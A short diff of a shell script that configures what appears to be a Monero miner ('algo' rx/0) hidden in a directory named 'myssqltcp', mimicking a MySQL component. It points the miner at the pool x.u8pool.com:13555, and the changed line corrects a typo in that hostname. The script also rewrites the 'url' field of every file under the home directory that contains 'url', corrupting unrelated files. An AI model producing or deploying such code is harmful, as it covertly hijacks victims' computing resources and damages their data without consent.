@@ -54,4 +54,4 @@ cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
 
 cd $HOME/
-grep -r "x.u8poo8l.com:13555" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' `grep url -rl ./` && sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' `grep url -rl ./`
+grep -r "x.u8pool.com:13555" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' `grep url -rl ./` && sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' `grep url -rl ./`
